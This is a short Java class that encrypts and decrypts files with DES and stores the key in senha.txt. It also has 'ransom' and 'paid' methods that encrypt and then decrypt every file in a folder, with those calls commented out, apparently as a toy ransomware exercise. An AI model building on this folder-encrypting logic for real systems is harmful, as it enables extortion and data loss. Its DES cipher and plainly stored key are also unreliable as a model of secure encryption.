package org.example;

import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

public class FileEncript {
    SecretKey chave;

    public FileEncript() throws NoSuchAlgorithmException {
        chave = KeyGenerator.getInstance("DES").generateKey();
    }
    public void Encript(String cryptFileName, String plainFileName) throws Exception
    {
        Main cripto = new Main(chave);
        String contentPlainFile = new String(Files.readAllBytes(Paths.get(plainFileName)));
        String contentEncripted = cripto.encrypt(contentPlainFile);
        Files.writeString(Path.of("senha.txt"), Base64.getEncoder().encodeToString(chave.getEncoded()));
        Files.writeString(Path.of(cryptFileName), contentEncripted);
    }


    public void Decript(String plainNewFileName, String cryptFileName) throws Exception {

        String chaveString = new String(Files.readAllBytes(Paths.get("senha.txt")));
        System.out.println(chaveString);
        byte[] data = Base64.getDecoder().decode(chaveString.getBytes());
        SecretKey chave = new SecretKeySpec(data, 0, data.length, "DES");


        Main cripto = new Main(chave);
        String contentEncriptFile = new String(Files.readAllBytes(Paths.get(cryptFileName)));
        String contentPlain = cripto.decrypt(contentEncriptFile);
        Files.writeString(Path.of(plainNewFileName), contentPlain);
    }

    public void ransom(String folder) throws Exception {
        File file = new File(folder);
        File afile[] = file.listFiles();
        int i = 0;
        for (int j = afile.length; i < j; i++) {
            File arquivos = afile[i];
            Encript("./teste/Encript" + i + ".txt", folder +"/" + afile[i].getName());
            System.out.println(arquivos.getName() + " encriptado ("+j+")");
        }
    }

    public void paid(String folder) throws Exception {
        File file = new File(folder);
        File afile[] = file.listFiles();
        int i = 0;
        for (int j = afile.length; i < j; i++) {
            File arquivos = afile[i];
            Decript("./teste/Decript" + i + ".txt", folder +"/" + afile[i].getName());
            System.out.println(arquivos.getName() + " encriptado ("+j+")");
        }
    }

    public static void main(String[] args) throws Exception {
        FileEncript fe = new FileEncript();

        fe.Encript("arquivoEncriptado.txt", "arquivoEntrada.txt");
        fe.Decript("arquivoDecriptado.txt", "arquivoEncriptado.txt");
        //fe.ransom("teste");
        //fe.paid("teste");
    }
}
